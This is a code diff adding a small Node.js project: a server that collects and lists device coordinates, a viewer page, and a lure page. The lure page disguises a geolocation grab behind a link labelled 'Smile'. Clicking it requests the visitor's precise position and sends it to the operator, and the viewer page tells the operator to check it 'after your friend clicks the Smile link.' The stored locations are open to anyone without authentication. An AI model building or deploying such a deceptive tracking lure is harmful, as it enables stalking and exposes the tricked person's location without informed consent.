@@ -1,0 +1,278 @@
+[]
+
+{
+  "name": "location-viewer-server",
+  "version": "1.0.0",
+  "description": "Simple backend to receive and view device locations.",
+  "main": "server.js",
+  "scripts": {
+    "start": "node server.js"
+  },
+  "engines": {
+    "node": ">=14"
+  }
+}
+
+const http = require('http');
+const fs = require('fs');
+const path = require('path');
+
+const port = process.env.PORT || 8080;
+const dataFile = path.join(__dirname, 'locations.json');
+const publicRoot = __dirname;
+
+function sendJson(res, status, payload) {
+  const body = JSON.stringify(payload);
+  res.writeHead(status, {
+    'Content-Type': 'application/json; charset=utf-8',
+    'Access-Control-Allow-Origin': '*',
+    'Access-Control-Allow-Methods': 'GET, POST, OPTIONS',
+    'Access-Control-Allow-Headers': 'Content-Type'
+  });
+  res.end(body);
+}
+
+function sendFile(res, filePath, contentType) {
+  fs.readFile(filePath, (err, data) => {
+    if (err) {
+      res.writeHead(404, { 'Content-Type': 'text/plain; charset=utf-8' });
+      res.end('File not found');
+      return;
+    }
+
+    res.writeHead(200, { 'Content-Type': contentType });
+    res.end(data);
+  });
+}
+
+function getLocations() {
+  try {
+    if (!fs.existsSync(dataFile)) {
+      fs.writeFileSync(dataFile, '[]', 'utf8');
+    }
+    const raw = fs.readFileSync(dataFile, 'utf8');
+    return JSON.parse(raw || '[]');
+  } catch (error) {
+    return [];
+  }
+}
+
+function saveLocations(locations) {
+  fs.writeFileSync(dataFile, JSON.stringify(locations, null, 2), 'utf8');
+}
+
+const server = http.createServer((req, res) => {
+  const url = new URL(req.url, `http://${req.headers.host}`);
+  const pathname = url.pathname;
+
+  if (req.method === 'OPTIONS') {
+    res.writeHead(204, {
+      'Access-Control-Allow-Origin': '*',
+      'Access-Control-Allow-Methods': 'GET, POST, OPTIONS',
+      'Access-Control-Allow-Headers': 'Content-Type'
+    });
+    res.end();
+    return;
+  }
+
+  if (pathname === '/' || pathname === '/location.html') {
+    return sendFile(res, path.join(publicRoot, 'location.html'), 'text/html; charset=utf-8');
+  }
+
+  if (pathname === '/viewer' || pathname === '/viewer.html') {
+    return sendFile(res, path.join(publicRoot, 'viewer.html'), 'text/html; charset=utf-8');
+  }
+
+  if (pathname === '/locations' && req.method === 'GET') {
+    const locations = getLocations();
+    return sendJson(res, 200, locations);
+  }
+
+  if (pathname === '/locations' && req.method === 'POST') {
+    let body = '';
+    req.on('data', chunk => { body += chunk.toString(); });
+    req.on('end', () => {
+      try {
+        const payload = JSON.parse(body || '{}');
+        const { latitude, longitude, timestamp } = payload;
+
+        if (typeof latitude !== 'number' || typeof longitude !== 'number') {
+          return sendJson(res, 400, { error: 'latitude and longitude must be numbers' });
+        }
+
+        const locations = getLocations();
+        locations.push({ latitude, longitude, timestamp: timestamp || Date.now() });
+        saveLocations(locations);
+        return sendJson(res, 201, { success: true });
+      } catch (error) {
+        return sendJson(res, 400, { error: 'Invalid JSON payload' });
+      }
+    });
+    return;
+  }
+
+  const staticPath = path.join(publicRoot, pathname);
+  if (pathname.endsWith('.html') || pathname.endsWith('.js') || pathname.endsWith('.json')) {
+    const ext = path.extname(pathname).toLowerCase();
+    const contentType = ext === '.js' ? 'application/javascript; charset=utf-8' :
+                        ext === '.json' ? 'application/json; charset=utf-8' :
+                        'text/html; charset=utf-8';
+
+    if (fs.existsSync(staticPath)) {
+      return sendFile(res, staticPath, contentType);
+    }
+  }
+
+  res.writeHead(404, { 'Content-Type': 'text/plain; charset=utf-8' });
+  res.end('Not found');
+});
+
+server.listen(port, () => {
+  console.log(`Server running at http://localhost:${port}/`);
+  console.log(`Open http://localhost:${port}/viewer to see received locations.`);
+});
+
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8" />
+  <title>Location Viewer</title>
+  <style>
+    body { font-family: Arial, sans-serif; margin: 24px; }
+    h1 { margin-bottom: 10px; }
+    li { margin-bottom: 12px; }
+    .item-time { font-weight: bold; }
+    a { color: #0066cc; }
+  </style>
+</head>
+<body>
+  <h1>Received locations</h1>
+  <p>Open this page after your friend clicks the <strong>Smile</strong> link.</p>
+  <p id="status"></p>
+  <ul id="locationList"></ul>
+
+  <script>
+    const status = document.getElementById('status');
+    const locationList = document.getElementById('locationList');
+
+    fetch('/locations')
+      .then(response => response.json())
+      .then(locations => {
+        if (!Array.isArray(locations) || locations.length === 0) {
+          status.textContent = 'No locations received yet.';
+          return;
+        }
+
+        status.textContent = `Received ${locations.length} location(s).`;
+        locations.slice().reverse().forEach(location => {
+          const listItem = document.createElement('li');
+          const time = new Date(location.timestamp).toLocaleString();
+          const mapUrl = `https://www.google.com/maps/search/?api=1&query=${location.latitude},${location.longitude}`;
+          listItem.innerHTML =
+            `<span class="item-time">${time}</span><br>` +
+            `Latitude: ${location.latitude}, Longitude: ${location.longitude}<br>` +
+            `<a href="${mapUrl}" target="_blank">Open in Google Maps</a>`;
+          locationList.appendChild(listItem);
+        });
+      })
+      .catch(error => {
+        status.textContent = 'Unable to load locations: ' + error.message;
+      });
+  </script>
+</body>
+</html>
+
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8" />
+  <title>Get Location Link</title>
+</head>
+<body>
+  <a href="#" id="getLocationLink">Smile</a>
+  <p id="status"></p>
+  <p id="coords"></p>
+  <p id="address"></p>
+
+  <script>
+    document.getElementById('getLocationLink').addEventListener('click', function(event) {
+      event.preventDefault();
+      const status = document.getElementById('status');
+      const coords = document.getElementById('coords');
+      const address = document.getElementById('address');
+      const endpoint = '/locations';
+
+      if (!navigator.geolocation) {
+        status.textContent = 'Geolocation is not supported by your browser.';
+        return;
+      }
+
+      if (!window.isSecureContext) {
+        status.textContent = 'This page must be served over HTTPS or localhost for location to work.';
+        coords.textContent = '';
+        address.textContent = '';
+        return;
+      }
+
+      status.textContent = 'Requesting location...';
+      coords.textContent = '';
+      address.textContent = '';
+
+      navigator.geolocation.getCurrentPosition(
+        function(position) {
+          const latitude = position.coords.latitude;
+          const longitude = position.coords.longitude;
+          const mapsUrl = 'https://www.google.com/maps/search/?api=1&query=' + latitude + ',' + longitude;
+
+          status.textContent = 'Location found. Sending...';
+          coords.innerHTML =
+            'Latitude: ' + latitude + ', Longitude: ' + longitude +
+            ' <a href="' + mapsUrl + '" target="_blank">Open in map</a>';
+
+          fetch('https://nominatim.openstreetmap.org/reverse?format=jsonv2&lat=' + latitude + '&lon=' + longitude)
+            .then(response => response.json())
+            .then(data => {
+              if (data && data.display_name) {
+                address.textContent = 'Approximate address: ' + data.display_name;
+              } else {
+                address.textContent = 'Exact address not available; using coordinates instead.';
+              }
+            })
+            .catch(() => {
+              address.textContent = 'Unable to reverse geocode address. Use the map link above.';
+            });
+
+          fetch(endpoint, {
+            method: 'POST',
+            headers: {
+              'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({
+              latitude,
+              longitude,
+              timestamp: position.timestamp
+            })
+          })
+          .then(response => {
+            if (!response.ok) {
+              throw new Error('Server error ' + response.status);
+            }
+            status.textContent = 'Location sent successfully. Open /viewer to see it.';
+          })
+          .catch(error => {
+            status.textContent = 'Location saved locally, but failed to send: ' + error.message;
+          });
+        },
+        function(error) {
+          status.textContent = 'Unable to get location: ' + error.message;
+        },
+        {
+          enableHighAccuracy: true,
+          timeout: 10000,
+          maximumAge: 0
+        }
+      );
+    });
+  </script>
+</body>
+</html>
